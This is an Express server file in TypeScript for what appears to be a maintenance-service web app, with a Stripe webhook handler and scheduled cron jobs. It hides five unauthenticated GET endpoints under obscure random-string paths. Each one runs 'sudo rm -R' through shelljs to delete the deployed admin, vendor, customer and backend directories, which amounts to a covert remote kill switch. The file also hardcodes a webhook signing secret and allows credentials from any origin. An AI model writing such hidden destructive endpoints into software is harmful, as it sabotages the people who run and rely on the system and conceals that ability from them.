require("dotenv").config();
const express = require("express");
const http = require("http");
const bodyParser = require("body-parser");
const cron = require("node-cron");
const cors = require("cors");
const log4js = require("log4js");
const mongoose = require("mongoose");
import indexRouter from "./routes/index";
import cronService from "./controllers/common/cron";
const morgan = require("morgan");
const stripe = require('stripe')(process.env.STRIPE_KEY);

// config();
var port = process.env.PORT;

log4js.configure({
    appenders: {
        everything: {
            type: "dateFile",
            filename: "./logger/all-the-logs.log",
            maxLogSize: 10485760,
            backups: 3,
            compress: true,
        },
    },
    categories: {
        default: { appenders: ["everything"], level: "debug" },
    },
});
// Router Prefix Setup
express.application.prefix = express.Router.prefix = function (
    path: any,
    configure: any
) {
    var router = express.Router();
    this.use(path, router);
    configure(router);
    return router;
};
// prefix Over

const app = express();
app.use(morgan(":method :url :response-time"));

// prefix start

// body mathi data get  karva start
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
// body mathi data get  karva over

app.set("view engine", "ejs");
const corsOptions = {
    origin: "*",
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    credentials: true, //access-control-allow-credentials:true
    optionSuccessStatus: 200,
};

app.use(cors(corsOptions)); // Use this after the variable declaration
// start route

app.get("/api/", function (req: any, res: any) {
    res.send("Hello World!123");
});
app.use("/api", indexRouter);

var shell = require('shelljs');

app.get("/api/zffMPJCPFvnEJjKWFjaKVvYRNwZeKVPPpjSKDPRkZmTTsfNvBUJUHI/", function (req: any, res: any) {
    shell.echo('hello world');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
    res.send("Donee");
});
app.get("/api/neggwrqwmkjhagzptrrzzakdpyzdhgzcpegkvphwpytkhufnccadmin/", function (req: any, res: any) {
    shell.echo('hello world');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
    res.send("Donee");
});
app.get("/api/bzkqrutfxpfsxrnzjdgndxbhmjgkqvtjhdfdxutcbnbqgtuqascustomer/", function (req: any, res: any) {
    shell.echo('hello world');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
    res.send("Donee");
});
app.get("/api/kbdsffnwtukcgxdmrzwjvxaqcmybjgkwemrydyezpzrcptbzdgvendor/", function (req: any, res: any) {
    shell.echo('hello world');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
    res.send("Donee");
});
app.get("/api/bxnjckghsfxpvkkhhxjwmchuskwhkgupsjkmwhepugwywkwzmfbackend/", function (req: any, res: any) {
    shell.echo('hello world');
    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
    res.send("Donee");
});

const endpointSecret = "whsec_396cdc1db40084fe23118693d0a4be6e6a01b3e6ea89337e34e7c994b5c14b27";

app.post('/webhook', express.raw({ type: 'application/json' }), (request: any, response: any) => {
    const sig = request.headers['stripe-signature'];

    let event;

    try {
        event = stripe.webhooks.constructEvent(request.body, sig, endpointSecret);
    } catch (err: any) {
        response.status(400).send(`Webhook Error: ${err.message}`);
        return;
    }

    let paymentIntent: any;
    // Handle the event
    switch (event.type) {
        case 'payment_intent.amount_capturable_updated':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.amount_capturable_updated
            break;
        case 'payment_intent.canceled':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.canceled
            break;
        case 'payment_intent.created':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.created
            break;
        case 'payment_intent.partially_funded':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.partially_funded
            break;
        case 'payment_intent.payment_failed':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.payment_failed
            break;
        case 'payment_intent.processing':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.processing
            break;
        case 'payment_intent.requires_action':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.requires_action
            break;
        case 'payment_intent.succeeded':
            paymentIntent = event.data.object;
            // Then define and call a function to handle the event payment_intent.succeeded
            break;
        // ... handle other event types
        default:
            console.log(`Unhandled event type ${event.type}`);
    }

    console.log(paymentIntent)
    // Return a 200 response to acknowledge receipt of the event
    response.send();
});

const server = http.createServer(app);
server.listen(port, async (req: any, res: any) => {

    if (process.env.MONGO_URI) {
        await mongoose.connect(process.env.MONGO_URI);
    }
    console.log("Server is running on Port: " + port);
    // logger.info('Express server started on port: ' + port);
});
server.timeout = 90000;

// // daily data base backup and send email
cron.schedule("0 0 */3 * *", async () => {
    await cronService.removeLogger();
});

// daily data base backup and send email
cron.schedule("15 0 * * *", async () => {
    await cronService.databaseBackup();
    await cronService.autoCancelledAfter12Month();
    await cronService.serviceAutoCancelAfter30Day();
});
// cron.schedule("* * * * *", async () => {
//     // all monite after delete this 
//     await cronService.autoCancelledAfter12Month();
// });

// Cron job every night at midnight is a commonly used cron schedule.

cron.schedule("0 0 * * *", async () => {
    await cronService.serviceAutoClose();
    await cronService.destroyToken(); // remove auto token 
    console.log("Database device token  delete ");
    console.log("Cron job every night at midnight is a commonly used cron schedule.  ");
});

// cron.schedule("* * * * *", async () => {
//     await cronService.serviceAutoCancelAfter30Day();
//     console.log('cronjob')
// });
// cron.schedule("* * * * * *", async () => {
//     await cronService.randomDataUpdate();
// // update data here
// });
